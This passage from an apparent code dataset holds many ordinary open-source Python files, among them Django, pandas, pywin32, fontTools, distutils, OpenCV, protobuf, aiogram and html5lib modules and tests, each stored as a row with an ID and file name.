                    ""Could not find object %s in %s.\n""
                    ""Please note that you cannot serialize things like inner ""
                    ""classes. Please move the object into the main module ""
                    ""body to use migrations.\n""
                    ""For more information, see ""
                    ""https://docs.djangoproject.com/en/%s/topics/migrations/""
                    ""#serializing-values"" % (name, module_name, get_docs_version())
                )
            return (
                path
                if path and type(obj) is klass
                else f""{obj.__class__.__module__}.{name}"",
                obj._constructor_args[0],
                obj._constructor_args[1],
            )

        klass.__new__ = staticmethod(__new__)
        klass.deconstruct = deconstruct

        return klass

    if not args:
        return decorator
    return decorator(*args)"
JY119	JY119-CLSIDToClass.py	"""""""Manages a dictionary of CLSID strings to Python classes.

Primary use of this module is to allow modules generated by
makepy.py to share classes.  @makepy@ automatically generates code
which interacts with this module.  You should never need to reference
this module directly.

This module only provides support for modules which have been previously
been imported.  The gencache module provides some support for loading modules
on demand - once done, this module supports it...

As an example, the MSACCESS.TLB type library makes reference to the
CLSID of the Database object, as defined in DAO3032.DLL.  This
allows code using the MSAccess wrapper to natively use Databases.

This obviously applies to all cooperating objects, not just DAO and
Access.
""""""
mapCLSIDToClass = {}


def RegisterCLSID(clsid, pythonClass):
    """"""Register a class that wraps a CLSID

    This function allows a CLSID to be globally associated with a class.
    Certain module will automatically convert an IDispatch object to an
    instance of the associated class.
    """"""

    mapCLSIDToClass[str(clsid)] = pythonClass


def RegisterCLSIDsFromDict(dict):
    """"""Register a dictionary of CLSID's and classes.

    This module performs the same function as @RegisterCLSID@, but for
    an entire dictionary of associations.

    Typically called by makepy generated modules at import time.
    """"""
    mapCLSIDToClass.update(dict)


def GetClass(clsid):
    """"""Given a CLSID, return the globally associated class.

    clsid -- a string CLSID representation to check.
    """"""
    return mapCLSIDToClass[clsid]


def HasClass(clsid):
    """"""Determines if the CLSID has an associated class.

    clsid -- the string CLSID to check
    """"""
    return clsid in mapCLSIDToClass"
JD307	JD307-main_test.py	"# Copyright 2021 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#      http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import os

from google.cloud import workflows_v1beta

import main

PROJECT = os.environ[""GOOGLE_CLOUD_PROJECT""]
LOCATION = ""us-central1""
WORKFLOW_ID = ""myFirstWorkflow""


def test_workflow_execution():
    assert PROJECT != """"

    if not workflow_exists():
        workflow_file = open(""myFirstWorkflow.workflows.yaml"", ""r"").read()

        workflows_client = workflows_v1beta.WorkflowsClient()
        workflows_client.create_workflow(request={
            # Manually construct the location
            # https://github.com/googleapis/python-workflows/issues/21
            ""parent"": f'projects/{PROJECT}/locations/{LOCATION}',
            ""workflow_id"": WORKFLOW_ID,
            ""workflow"": {
                ""name"": WORKFLOW_ID,
                ""source_contents"": workflow_file
            }
        })

    result = main.execute_workflow(PROJECT)
    assert len(result) > 0


def workflow_exists():
    """"""Returns True if the workflow exists in this project
    """"""
    try:
        workflows_client = workflows_v1beta.WorkflowsClient()
        workflow_name = workflows_client.workflow_path(PROJECT, LOCATION, WORKFLOW_ID)
        workflows_client.get_workflow(request={""name"": workflow_name})
        return True
    except Exception as e:
        print(f""Workflow doesn't exist: {e}"")
        return False"
JY471	JY471-test_comparison.py	"import numpy as np
import pytest

import pandas as pd
import pandas._testing as tm
from pandas.core.arrays import FloatingArray
from pandas.tests.arrays.masked_shared import (
    ComparisonOps,
    NumericOps,
)


class TestComparisonOps(NumericOps, ComparisonOps):
    @pytest.mark.parametrize(""other"", [True, False, pd.NA, -1.0, 0.0, 1])
    def test_scalar(self, other, comparison_op, dtype):
        ComparisonOps.test_scalar(self, other, comparison_op, dtype)

    def test_compare_with_integerarray(self, comparison_op):
        op = comparison_op
        a = pd.array([0, 1, None] * 3, dtype=""Int64"")
        b = pd.array([0] * 3 + [1] * 3 + [None] * 3, dtype=""Float64"")
        other = b.astype(""Int64"")
        expected = op(a, other)
        result = op(a, b)
        tm.assert_extension_array_equal(result, expected)
        expected = op(other, a)
        result = op(b, a)
        tm.assert_extension_array_equal(result, expected)


def test_equals():
    # GH-30652
    # equals is generally tested in /tests/extension/base/methods, but this
    # specifically tests that two arrays of the same class but different dtype
    # do not evaluate equal
    a1 = pd.array([1, 2, None], dtype=""Float64"")
    a2 = pd.array([1, 2, None], dtype=""Float32"")
    assert a1.equals(a2) is False


def test_equals_nan_vs_na():
    # GH#44382

    mask = np.zeros(3, dtype=bool)
    data = np.array([1.0, np.nan, 3.0], dtype=np.float64)

    left = FloatingArray(data, mask)
    assert left.equals(left)
    tm.assert_extension_array_equal(left, left)

    assert left.equals(left.copy())
    assert left.equals(FloatingArray(data.copy(), mask.copy()))

    mask2 = np.array([False, True, False], dtype=bool)
    data2 = np.array([1.0, 2.0, 3.0], dtype=np.float64)
    right = FloatingArray(data2, mask2)
    assert right.equals(right)
    tm.assert_extension_array_equal(right, right)

    assert not left.equals(right)

    # with mask[1] = True, the only difference is data[1], which should
    #  not matter for equals
    mask[1] = True
    assert left.equals(right)"
JD230	JD230-test_reindex.py	"from datetime import timedelta

import numpy as np

from pandas import (
    DatetimeIndex,
    date_range,
)
import pandas._testing as tm


class TestDatetimeIndexReindex:
    def test_reindex_preserves_tz_if_target_is_empty_list_or_array(self):
        # GH#7774
        index = date_range(""2013-01-01"", periods=3, tz=""US/Eastern"")
        assert str(index.reindex([])[0].tz) == ""US/Eastern""
        assert str(index.reindex(np.array([]))[0].tz) == ""US/Eastern""

    def test_reindex_with_same_tz_nearest(self):
        # GH#32740
        rng_a = date_range(""2010-01-01"", ""2010-01-02"", periods=24, tz=""utc"")
        rng_b = date_range(""2010-01-01"", ""2010-01-02"", periods=23, tz=""utc"")
        result1, result2 = rng_a.reindex(
            rng_b, method=""nearest"", tolerance=timedelta(seconds=20)
        )
        expected_list1 = [
            ""2010-01-01 00:00:00"",
            ""2010-01-01 01:05:27.272727272"",
            ""2010-01-01 02:10:54.545454545"",
            ""2010-01-01 03:16:21.818181818"",
            ""2010-01-01 04:21:49.090909090"",
            ""2010-01-01 05:27:16.363636363"",
            ""2010-01-01 06:32:43.636363636"",
            ""2010-01-01 07:38:10.909090909"",
            ""2010-01-01 08:43:38.181818181"",
            ""2010-01-01 09:49:05.454545454"",
            ""2010-01-01 10:54:32.727272727"",
            ""2010-01-01 12:00:00"",
            ""2010-01-01 13:05:27.272727272"",
            ""2010-01-01 14:10:54.545454545"",
            ""2010-01-01 15:16:21.818181818"",
            ""2010-01-01 16:21:49.090909090"",
            ""2010-01-01 17:27:16.363636363"",
            ""2010-01-01 18:32:43.636363636"",
            ""2010-01-01 19:38:10.909090909"",
            ""2010-01-01 20:43:38.181818181"",
            ""2010-01-01 21:49:05.454545454"",
            ""2010-01-01 22:54:32.727272727"",
            ""2010-01-02 00:00:00"",
        ]
        expected1 = DatetimeIndex(
            expected_list1, dtype=""datetime64[ns, UTC]"", freq=None
        )
        expected2 = np.array([0] + [-1] * 21 + [23], dtype=np.dtype(""intp""))
        tm.assert_index_equal(result1, expected1)
        tm.assert_numpy_array_equal(result2, expected2)"
JY483	JY483-mixins.py	"from django.core import checks

NOT_PROVIDED = object()


class FieldCacheMixin:
    """"""Provide an API for working with the model's fields value cache.""""""

    def get_cache_name(self):
        raise NotImplementedError

    def get_cached_value(self, instance, default=NOT_PROVIDED):
        cache_name = self.get_cache_name()
        try:
            return instance._state.fields_cache[cache_name]
        except KeyError:
            if default is NOT_PROVIDED:
                raise
            return default

    def is_cached(self, instance):
        return self.get_cache_name() in instance._state.fields_cache

    def set_cached_value(self, instance, value):
        instance._state.fields_cache[self.get_cache_name()] = value

    def delete_cached_value(self, instance):
        del instance._state.fields_cache[self.get_cache_name()]


class CheckFieldDefaultMixin:
    _default_hint = ('<valid default>', '<invalid default>')

    def _check_default(self):
        if self.has_default() and self.default is not None and not callable(self.default):
            return [
                checks.Warning(
                    ""%s default should be a callable instead of an instance ""
                    ""so that it's not shared between all field instances."" % (
                        self.__class__.__name__,
                    ),
                    hint=(
                        'Use a callable instead, e.g., use `%s` instead of '
                        '`%s`.' % self._default_hint
                    ),
                    obj=self,
                    id='fields.E010',
                )
            ]
        else:
            return []

    def check(self, **kwargs):
        errors = super().check(**kwargs)
        errors.extend(self._check_default())
        return errors"
JD117	JD117-formats.py	"# This file is distributed under the same license as the Django package.
#
# The *_FORMAT strings use the Django date format syntax,
# see https://docs.djangoproject.com/en/dev/ref/templates/builtins/#date
DATE_FORMAT = r'j\-\a \d\e F Y'         # '26-a de julio 1887'
TIME_FORMAT = 'H:i'                     # '18:59'
DATETIME_FORMAT = r'j\-\a \d\e F Y\, \j\e H:i'  # '26-a de julio 1887, je 18:59'
YEAR_MONTH_FORMAT = r'F \d\e Y'         # 'julio de 1887'
MONTH_DAY_FORMAT = r'j\-\a \d\e F'      # '26-a de julio'
SHORT_DATE_FORMAT = 'Y-m-d'             # '1887-07-26'
SHORT_DATETIME_FORMAT = 'Y-m-d H:i'     # '1887-07-26 18:59'
FIRST_DAY_OF_WEEK = 1  # Monday (lundo)

# The *_INPUT_FORMATS strings use the Python strftime format syntax,
# see https://docs.python.org/library/datetime.html#strftime-strptime-behavior
DATE_INPUT_FORMATS = [
    '%Y-%m-%d',                         # '1887-07-26'
    '%y-%m-%d',                         # '87-07-26'
    '%Y %m %d',                         # '1887 07 26'
    '%Y.%m.%d',                         # '1887.07.26'
    '%d-a de %b %Y',                    # '26-a de jul 1887'
    '%d %b %Y',                         # '26 jul 1887'
    '%d-a de %B %Y',                    # '26-a de julio 1887'
    '%d %B %Y',                         # '26 julio 1887'
    '%d %m %Y',                         # '26 07 1887'
    '%d/%m/%Y',                         # '26/07/1887'
]
TIME_INPUT_FORMATS = [
    '%H:%M:%S',                         # '18:59:00'
    '%H:%M',                            # '18:59'
]
DATETIME_INPUT_FORMATS = [
    '%Y-%m-%d %H:%M:%S',                # '1887-07-26 18:59:00'
    '%Y-%m-%d %H:%M',                   # '1887-07-26 18:59'

    '%Y.%m.%d %H:%M:%S',                # '1887.07.26 18:59:00'
    '%Y.%m.%d %H:%M',                   # '1887.07.26 18:59'

    '%d/%m/%Y %H:%M:%S',                # '26/07/1887 18:59:00'
    '%d/%m/%Y %H:%M',                   # '26/07/1887 18:59'

    '%y-%m-%d %H:%M:%S',                # '87-07-26 18:59:00'
    '%y-%m-%d %H:%M',                   # '87-07-26 18:59'
]
DECIMAL_SEPARATOR = ','
THOUSAND_SEPARATOR = '\xa0'  # non-breaking space
NUMBER_GROUPING = 3"
JD51	JD51-_structures.py	"# This file is dual licensed under the terms of the Apache License, Version
# 2.0, and the BSD License. See the LICENSE file in the root of this repository
# for complete details.
from __future__ import absolute_import, division, print_function


class InfinityType(object):
    def __repr__(self):
        # type: () -> str
        return ""Infinity""

    def __hash__(self):
        # type: () -> int
        return hash(repr(self))

    def __lt__(self, other):
        # type: (object) -> bool
        return False

    def __le__(self, other):
        # type: (object) -> bool
        return False

    def __eq__(self, other):
        # type: (object) -> bool
        return isinstance(other, self.__class__)

    def __ne__(self, other):
        # type: (object) -> bool
        return not isinstance(other, self.__class__)

    def __gt__(self, other):
        # type: (object) -> bool
        return True

    def __ge__(self, other):
        # type: (object) -> bool
        return True

    def __neg__(self):
        # type: (object) -> NegativeInfinityType
        return NegativeInfinity


Infinity = InfinityType()


class NegativeInfinityType(object):
    def __repr__(self):
        # type: () -> str
        return ""-Infinity""

    def __hash__(self):
        # type: () -> int
        return hash(repr(self))

    def __lt__(self, other):
        # type: (object) -> bool
        return True

    def __le__(self, other):
        # type: (object) -> bool
        return True

    def __eq__(self, other):
        # type: (object) -> bool
        return isinstance(other, self.__class__)

    def __ne__(self, other):
        # type: (object) -> bool
        return not isinstance(other, self.__class__)

    def __gt__(self, other):
        # type: (object) -> bool
        return False

    def __ge__(self, other):
        # type: (object) -> bool
        return False

    def __neg__(self):
        # type: (object) -> InfinityType
        return Infinity


NegativeInfinity = NegativeInfinityType()"
JY256	JY256-Stratigraphy.py	"import numpy as np
import numba

# - plotStratigraphy takes 1) XorY_StratiOverTime (time and either x or y dimensions): strati__elevation selected for only the basin area and either averaged or selected for one across (y)/down(x) basin distance 
#     2) XorY_GrainSizeOverTime (time and either x or y dimensions) the grain size or erosion rate or other desired variable that will be used to fill the stratigraphy. This also needs to be selected or averaged for one x/y distance. 
# - stratigraphy as it is written assumes that channels are draining either in the x or y direction (mountain along one axis) and stratigraphy is generated along one axis.     
# - plotStratigraphy averages the nearby nodes (grain size or erosion rate or other desired value passed) to fill a given cell of stratigraphy.
# -plotStraigraphy2 does not average the nearest nodes and takes the first closest value to fill the stratigraphy. 

@numba.njit
def plotStratigraphy(XorY_StratiOverTime,XorY_GrainSizeOverTime):
    i=0
    j=0
    C=np.zeros(((XorY_StratiOverTime.shape[0]),(XorY_StratiOverTime.shape[1])))
    for i in range(0,(XorY_StratiOverTime.shape[1])):
        for j in range(0,(XorY_StratiOverTime.shape[0])):
            tryff=np.array([XorY_GrainSizeOverTime[j,i],XorY_GrainSizeOverTime[j,i+1],XorY_GrainSizeOverTime[j+1,i],XorY_GrainSizeOverTime[j+1,i+1]])
            C[j,i]=np.nanmean(tryff)
    return C

@numba.njit
def plotStratigraphy2(XorY_StratiOverTime,XorY_GrainSizeOverTime):
    i=0
    j=0
    C=np.zeros(((XorY_StratiOverTime.shape[0]),(XorY_StratiOverTime.shape[1])))
    for i in range(0,(XorY_StratiOverTime.shape[1])):
        for j in range(0,(XorY_StratiOverTime.shape[0])):
            #tryff=np.array([XorY_GrainSizeOverTime[j,i],XorY_GrainSizeOverTime[j,i+1],XorY_GrainSizeOverTime[j+1,i],XorY_GrainSizeOverTime[j+1,i+1]])
            C[j,i]=(XorY_GrainSizeOverTime[j,i])
    return C"
JD372	JD372-reportLabPen.py	"from fontTools.pens.basePen import BasePen
from reportlab.graphics.shapes import Path


__all__ = [""ReportLabPen""]


class ReportLabPen(BasePen):

    """"""A pen for drawing onto a ``reportlab.graphics.shapes.Path`` object.""""""

    def __init__(self, glyphSet, path=None):
        BasePen.__init__(self, glyphSet)
        if path is None:
            path = Path()
        self.path = path

    def _moveTo(self, p):
        (x, y) = p
        self.path.moveTo(x, y)

    def _lineTo(self, p):
        (x, y) = p
        self.path.lineTo(x, y)

    def _curveToOne(self, p1, p2, p3):
        (x1, y1) = p1
        (x2, y2) = p2
        (x3, y3) = p3
        self.path.curveTo(x1, y1, x2, y2, x3, y3)

    def _closePath(self):
        self.path.closePath()


if __name__ == ""__main__"":
    import sys

    if len(sys.argv) < 3:
        print(
            ""Usage: reportLabPen.py <OTF/TTF font> <glyphname> [<image file to create>]""
        )
        print(
            ""  If no image file name is created, by default <glyphname>.png is created.""
        )
        print(""  example: reportLabPen.py Arial.TTF R test.png"")
        print(
            ""  (The file format will be PNG, regardless of the image file name supplied)""
        )
        sys.exit(0)

    from fontTools.ttLib import TTFont
    from reportlab.lib import colors

    path = sys.argv[1]
    glyphName = sys.argv[2]
    if len(sys.argv) > 3:
        imageFile = sys.argv[3]
    else:
        imageFile = ""%s.png"" % glyphName

    font = TTFont(path)  # it would work just as well with fontTools.t1Lib.T1Font
    gs = font.getGlyphSet()
    pen = ReportLabPen(gs, Path(fillColor=colors.red, strokeWidth=5))
    g = gs[glyphName]
    g.draw(pen)

    w, h = g.width, 1000
    from reportlab.graphics import renderPM
    from reportlab.graphics.shapes import Group, Drawing, scale

    # Everything is wrapped in a group to allow transformations.
    g = Group(pen.path)
    g.translate(0, 200)
    g.scale(0.3, 0.3)

    d = Drawing(w, h)
    d.add(g)

    renderPM.drawToFile(d, imageFile, fmt=""PNG"")"
JY343	JY343-install_scripts.py	"""""""distutils.command.install_scripts

Implements the Distutils 'install_scripts' command, for installing
Python scripts.""""""

# contributed by Bastian Kleineidam

import os
from ..core import Command
from distutils._log import log
from stat import ST_MODE


class install_scripts(Command):
    description = ""install scripts (Python or otherwise)""

    user_options = [
        ('install-dir=', 'd', ""directory to install scripts to""),
        ('build-dir=', 'b', ""build directory (where to install from)""),
        ('force', 'f', ""force installation (overwrite existing files)""),
        ('skip-build', None, ""skip the build steps""),
    ]

    boolean_options = ['force', 'skip-build']

    def initialize_options(self):
        self.install_dir = None
        self.force = 0
        self.build_dir = None
        self.skip_build = None

    def finalize_options(self):
        self.set_undefined_options('build', ('build_scripts', 'build_dir'))
        self.set_undefined_options(
            'install',
            ('install_scripts', 'install_dir'),
            ('force', 'force'),
            ('skip_build', 'skip_build'),
        )

    def run(self):
        if not self.skip_build:
            self.run_command('build_scripts')
        self.outfiles = self.copy_tree(self.build_dir, self.install_dir)
        if os.name == 'posix':
            # Set the executable bits (owner, group, and world) on
            # all the scripts we just installed.
            for file in self.get_outputs():
                if self.dry_run:
                    log.info(""changing mode of %s"", file)
                else:
                    mode = ((os.stat(file)[ST_MODE]) | 0o555) & 0o7777
                    log.info(""changing mode of %s to %o"", file, mode)
                    os.chmod(file, mode)

    def get_inputs(self):
        return self.distribution.scripts or []

    def get_outputs(self):
        return self.outfiles or []"
JD13	JD13-urls.py	"""""""tst_tc751_ckuayzoqs_68554 URL Configuration

The `urlpatterns` list routes URLs to views. For more information please see:
    https://docs.djangoproject.com/en/2.2/topics/http/urls/
Examples:
Function views
    1. Add an import:  from my_app import views
    2. Add a URL to urlpatterns:  path('', views.home, name='home')
Class-based views
    1. Add an import:  from other_app.views import Home
    2. Add a URL to urlpatterns:  path('', Home.as_view(), name='home')
Including another URLconf
    1. Import the include() function: from django.urls import include, path
    2. Add a URL to urlpatterns:  path('blog/', include('blog.urls'))
""""""

from django.contrib import admin
from django.urls import path, include, re_path
from django.views.generic.base import TemplateView
from allauth.account.views import confirm_email
from rest_framework import permissions
from drf_spectacular.views import SpectacularJSONAPIView, SpectacularSwaggerView

urlpatterns = [
    
    path(""accounts/"", include(""allauth.urls"")),
    path(""modules/"", include(""modules.urls"")),
    path(""api/v1/"", include(""home.api.v1.urls"")),
    path(""admin/"", admin.site.urls),
    path(""users/"", include(""users.urls"", namespace=""users"")),
    path(""rest-auth/"", include(""rest_auth.urls"")),
    # Override email confirm to use allauth's HTML view instead of rest_auth's API view
    path(""rest-auth/registration/account-confirm-email/<str:key>/"", confirm_email),
    path(""rest-auth/registration/"", include(""rest_auth.registration.urls"")),
]

admin.site.site_header = ""TST-TC751-ckuayzoqsc""
admin.site.site_title = ""TST-TC751-ckuayzoqsc Admin Portal""
admin.site.index_title = ""TST-TC751-ckuayzoqsc Admin""

# swagger
urlpatterns += [
    path(""api-docs/schema/"", SpectacularJSONAPIView.as_view(), name=""schema""),
    path(""api-docs/"", SpectacularSwaggerView.as_view(url_name='schema'), name=""api_docs"")
]


urlpatterns += [re_path(r"".*"",TemplateView.as_view(template_name='index.html'))]"
JY1	JY1-0001_initial.py	"# Generated by Django 3.2.18 on 2023-03-08 13:34

from django.conf import settings
from django.db import migrations, models
import django.db.models.deletion
import taggit.managers


class Migration(migrations.Migration):

    initial = True

    dependencies = [
        migrations.swappable_dependency(settings.AUTH_USER_MODEL),
    ]

    operations = [
        migrations.CreateModel(
            name='Group',
            fields=[
                ('id', models.BigAutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID')),
                ('created_at', models.DateTimeField(auto_now_add=True)),
                ('updated_at', models.DateTimeField(auto_now=True)),
                ('title', models.CharField(max_length=160)),
                ('category', models.CharField(choices=[('spiritual', 'SPIRITUAl'), ('financial', 'FINANCIAL'), ('career', 'CAREER'), ('intellectual', 'INTELLECTUAL'), ('fitness', 'FITNESS'), ('social', 'SOCIAL')], max_length=25)),
                ('description', models.TextField(max_length=255)),
                ('criteria', models.TextField()),
                ('date', models.DateTimeField()),
                ('repetition', models.CharField(choices=[('never', 'NEVER'), ('daily', 'DAILY'), ('weekly', 'WEEKLY'), ('monthly', 'MONTHLY'), ('annualy', 'ANNUALY')], default='never', max_length=25)),
                ('owner', models.ForeignKey(on_delete=django.db.models.deletion.CASCADE, to=settings.AUTH_USER_MODEL)),
                ('tags', taggit.managers.TaggableManager(help_text='A comma-separated list of tags.', through='taggit.TaggedItem', to='taggit.Tag', verbose_name='Tags')),
            ],
            options={
                'ordering': ['-created_at'],
            },
        ),
    ]"
JY313	JY313-test_gaussian_mix.py	"#!/usr/bin/env python

# Python 2/3 compatibility
from __future__ import print_function
import sys
PY3 = sys.version_info[0] == 3

if PY3:
    xrange = range

import numpy as np
from numpy import random
import cv2 as cv

def make_gaussians(cluster_n, img_size):
    points = []
    ref_distrs = []
    for _ in xrange(cluster_n):
        mean = (0.1 + 0.8*random.rand(2)) * img_size
        a = (random.rand(2, 2)-0.5)*img_size*0.1
        cov = np.dot(a.T, a) + img_size*0.05*np.eye(2)
        n = 100 + random.randint(900)
        pts = random.multivariate_normal(mean, cov, n)
        points.append( pts )
        ref_distrs.append( (mean, cov) )
    points = np.float32( np.vstack(points) )
    return points, ref_distrs

from tests_common import NewOpenCVTests

class gaussian_mix_test(NewOpenCVTests):

    def test_gaussian_mix(self):

        np.random.seed(10)
        cluster_n = 5
        img_size = 512

        points, ref_distrs = make_gaussians(cluster_n, img_size)

        em = cv.ml.EM_create()
        em.setClustersNumber(cluster_n)
        em.setCovarianceMatrixType(cv.ml.EM_COV_MAT_GENERIC)
        em.trainEM(points)
        means = em.getMeans()
        covs = em.getCovs()  # Known bug: https://github.com/opencv/opencv/pull/4232
        #found_distrs = zip(means, covs)

        matches_count = 0

        meanEps = 0.05
        covEps = 0.1

        for i in range(cluster_n):
            for j in range(cluster_n):
                if (cv.norm(means[i] - ref_distrs[j][0], cv.NORM_L2) / cv.norm(ref_distrs[j][0], cv.NORM_L2) < meanEps and
                    cv.norm(covs[i] - ref_distrs[j][1], cv.NORM_L2) / cv.norm(ref_distrs[j][1], cv.NORM_L2) < covEps):
                    matches_count += 1

        self.assertEqual(matches_count, cluster_n)


if __name__ == '__main__':
    NewOpenCVTests.bootstrap()"
JD174	JD174-Spinner_pb2.py	"# -*- coding: utf-8 -*-
# Generated by the protocol buffer compiler.  DO NOT EDIT!
# source: streamlit/proto/Spinner.proto

from google.protobuf import descriptor as _descriptor
from google.protobuf import message as _message
from google.protobuf import reflection as _reflection
from google.protobuf import symbol_database as _symbol_database
# @@protoc_insertion_point(imports)

_sym_db = _symbol_database.Default()




DESCRIPTOR = _descriptor.FileDescriptor(
  name='streamlit/proto/Spinner.proto',
  package='',
  syntax='proto3',
  serialized_options=None,
  create_key=_descriptor._internal_create_key,
  serialized_pb=b'\n\x1dstreamlit/proto/Spinner.proto\""\x17\n\x07Spinner\x12\x0c\n\x04text\x18\x01 \x01(\tb\x06proto3'
)




_SPINNER = _descriptor.Descriptor(
  name='Spinner',
  full_name='Spinner',
  filename=None,
  file=DESCRIPTOR,
  containing_type=None,
  create_key=_descriptor._internal_create_key,
  fields=[
    _descriptor.FieldDescriptor(
      name='text', full_name='Spinner.text', index=0,
      number=1, type=9, cpp_type=9, label=1,
      has_default_value=False, default_value=b"""".decode('utf-8'),
      message_type=None, enum_type=None, containing_type=None,
      is_extension=False, extension_scope=None,
      serialized_options=None, file=DESCRIPTOR,  create_key=_descriptor._internal_create_key),
  ],
  extensions=[
  ],
  nested_types=[],
  enum_types=[
  ],
  serialized_options=None,
  is_extendable=False,
  syntax='proto3',
  extension_ranges=[],
  oneofs=[
  ],
  serialized_start=33,
  serialized_end=56,
)

DESCRIPTOR.message_types_by_name['Spinner'] = _SPINNER
_sym_db.RegisterFileDescriptor(DESCRIPTOR)

Spinner = _reflection.GeneratedProtocolMessageType('Spinner', (_message.Message,), {
  'DESCRIPTOR' : _SPINNER,
  '__module__' : 'streamlit.proto.Spinner_pb2'
  # @@protoc_insertion_point(class_scope:Spinner)
  })
_sym_db.RegisterMessage(Spinner)


# @@protoc_insertion_point(module_scope)"
JD400	JD400-sample_pubsub_test_integration.py	"# Copyright 2020 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the 'License');
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an 'AS IS' BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

# [START functions_pubsub_integration_test]
import base64
import os
import subprocess
import uuid

import requests
from requests.packages.urllib3.util.retry import Retry


def test_print_name():
    name = str(uuid.uuid4())
    port = 8088  # Each running framework instance needs a unique port

    encoded_name = base64.b64encode(name.encode('utf-8')).decode('utf-8')
    pubsub_message = {
        'data': {'data': encoded_name}
    }

    process = subprocess.Popen(
      [
        'functions-framework',
        '--target', 'hello_pubsub',
        '--signature-type', 'event',
        '--port', str(port)
      ],
      cwd=os.path.dirname(__file__),
      stdout=subprocess.PIPE
    )

    # Send HTTP request simulating Pub/Sub message
    # (GCF translates Pub/Sub messages to HTTP requests internally)
    url = f'http://localhost:{port}/'

    retry_policy = Retry(total=6, backoff_factor=1)
    retry_adapter = requests.adapters.HTTPAdapter(
      max_retries=retry_policy)

    session = requests.Session()
    session.mount(url, retry_adapter)

    response = session.post(url, json=pubsub_message)

    assert response.status_code == 200

    # Stop the functions framework process
    process.kill()
    process.wait()
    out, err = process.communicate()

    print(out, err, response.content)

    assert f'Hello {name}!' in str(out)
# [END functions_pubsub_integration_test]"
JY67	JY67-sticker.py	"from . import base
from . import fields
from . import mixins
from .mask_position import MaskPosition
from .photo_size import PhotoSize
from .file import File


class Sticker(base.TelegramObject, mixins.Downloadable):
    """"""
    This object represents a sticker.

    https://core.telegram.org/bots/api#sticker
    """"""
    file_id: base.String = fields.Field()
    file_unique_id: base.String = fields.Field()
    type: base.String = fields.Field()
    width: base.Integer = fields.Field()
    height: base.Integer = fields.Field()
    is_animated: base.Boolean = fields.Field()
    is_video: base.Boolean = fields.Field()
    thumb: PhotoSize = fields.Field(base=PhotoSize)
    emoji: base.String = fields.Field()
    set_name: base.String = fields.Field()
    premium_animation: File = fields.Field(base=File)
    mask_position: MaskPosition = fields.Field(base=MaskPosition)
    custom_emoji_id: base.String = fields.Field()
    file_size: base.Integer = fields.Field()

    async def set_position_in_set(self, position: base.Integer) -> base.Boolean:
        """"""
        Use this method to move a sticker in a set created by the bot to a specific position.

        Source: https://core.telegram.org/bots/api#setstickerpositioninset

        :param position: New sticker position in the set, zero-based
        :type position: :obj:`base.Integer`
        :return: Returns True on success
        :rtype: :obj:`base.Boolean`
        """"""
        return await self.bot.set_sticker_position_in_set(self.file_id, position=position)

    async def delete_from_set(self) -> base.Boolean:
        """"""
        Use this method to delete a sticker from a set created by the bot.

        Source: https://core.telegram.org/bots/api#deletestickerfromset

        :return: Returns True on success
        :rtype: :obj:`base.Boolean`
        """"""
        return await self.bot.delete_sticker_from_set(self.file_id)"
JD110	JD110-formats.py	"# This file is distributed under the same license as the Django package.
#
# The *_FORMAT strings use the Django date format syntax,
# see https://docs.djangoproject.com/en/dev/ref/templates/builtins/#date
DATE_FORMAT = 'j N Y'
DATETIME_FORMAT = ""j N Y, G.i""
TIME_FORMAT = 'G.i'
YEAR_MONTH_FORMAT = 'F Y'
MONTH_DAY_FORMAT = 'j F'
SHORT_DATE_FORMAT = 'd-m-Y'
SHORT_DATETIME_FORMAT = 'd-m-Y G.i'
FIRST_DAY_OF_WEEK = 1  # Monday

# The *_INPUT_FORMATS strings use the Python strftime format syntax,
# see https://docs.python.org/library/datetime.html#strftime-strptime-behavior
DATE_INPUT_FORMATS = [
    '%d-%m-%Y', '%d/%m/%Y',             # '25-10-2009', 25/10/2009'
    '%d-%m-%y', '%d/%m/%y',             # '25-10-09', 25/10/09'
    '%d %b %Y',                         # '25 Oct 2006',
    '%d %B %Y',                         # '25 October 2006'
    '%m/%d/%y', '%m/%d/%Y',             # '10/25/06', '10/25/2009'
]

TIME_INPUT_FORMATS = [
    '%H.%M.%S',                         # '14.30.59'
    '%H.%M',                            # '14.30'
]

DATETIME_INPUT_FORMATS = [
    '%d-%m-%Y %H.%M.%S',                # '25-10-2009 14.30.59'
    '%d-%m-%Y %H.%M.%S.%f',             # '25-10-2009 14.30.59.000200'
    '%d-%m-%Y %H.%M',                   # '25-10-2009 14.30'
    '%d-%m-%y %H.%M.%S',                # '25-10-09' 14.30.59'
    '%d-%m-%y %H.%M.%S.%f',             # '25-10-09' 14.30.59.000200'
    '%d-%m-%y %H.%M',                   # '25-10-09' 14.30'
    '%m/%d/%y %H.%M.%S',                # '10/25/06 14.30.59'
    '%m/%d/%y %H.%M.%S.%f',             # '10/25/06 14.30.59.000200'
    '%m/%d/%y %H.%M',                   # '10/25/06 14.30'
    '%m/%d/%Y %H.%M.%S',                # '25/10/2009 14.30.59'
    '%m/%d/%Y %H.%M.%S.%f',             # '25/10/2009 14.30.59.000200'
    '%m/%d/%Y %H.%M',                   # '25/10/2009 14.30'
]

DECIMAL_SEPARATOR = ','
THOUSAND_SEPARATOR = '.'
NUMBER_GROUPING = 3"
JY426	JY426-sax.py	"from __future__ import absolute_import, division, unicode_literals

from xml.sax.xmlreader import AttributesNSImpl

from ..constants import adjustForeignAttributes, unadjustForeignAttributes

prefix_mapping = {}
for prefix, localName, namespace in adjustForeignAttributes.values():
    if prefix is not None:
        prefix_mapping[prefix] = namespace


def to_sax(walker, handler):
    """"""Call SAX-like content handler based on treewalker walker

    :arg walker: the treewalker to use to walk the tree to convert it

    :arg handler: SAX handler to use

    """"""
    handler.startDocument()
    for prefix, namespace in prefix_mapping.items():
        handler.startPrefixMapping(prefix, namespace)

    for token in walker:
        type = token[""type""]
